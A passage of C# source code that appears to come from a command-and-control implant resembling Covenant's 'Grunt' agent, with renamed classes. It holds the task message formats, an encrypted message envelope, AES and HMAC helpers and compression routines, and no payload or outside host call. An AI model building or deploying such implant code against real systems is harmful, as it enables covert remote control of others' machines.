        Connect,
        Disconnect,
        Tasks,
        TaskKill
    }

    public class AntTskMess
    {
        public AntTskType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""amess"":""{2}"",""token"":{3}}}";
        public static AntTskMess FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
            if (parseList.Count < 3) { return null; }
            return new AntTskMess
            {
                Type = (AntTskType)Enum.Parse(typeof(AntTskType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(AntTskMess message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public enum AntTskStat
    {
        Uninitialized,
        Tasked,
        Progressed,
        Completed,
        Aborted
    }

    public class AntTskMessResp
    {
        public AntTskMessResp(AntTskStat status, string output)
        {
            Status = status;
            Output = output;
        }
        public AntTskStat Status { get; set; }
        public string Output { get; set; }

        private static string AntTskMEssResponseFormat = @"{{""status"":""{0}"",""myout"":""{1}""}}";
        public string ToJson()
        {
            return String.Format(
                AntTskMEssResponseFormat,
                this.Status.ToString("D"),
                Utilities.JavaScriptStringEncode(this.Output)
            );
        }
    }

    public class AntEncMess
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

        public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
        public string IV { get; set; } = "";
        public string EncryptedMessage { get; set; } = "";
        public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string AntEncMessForm = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static AntEncMess FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, AntEncMessForm);
            if (parseList.Count < 5) { return null; }
            return new AntEncMess
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(AntEncMess message)
        {
            return String.Format(
                AntEncMessForm,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding AntEnc = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(AntEncMess encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}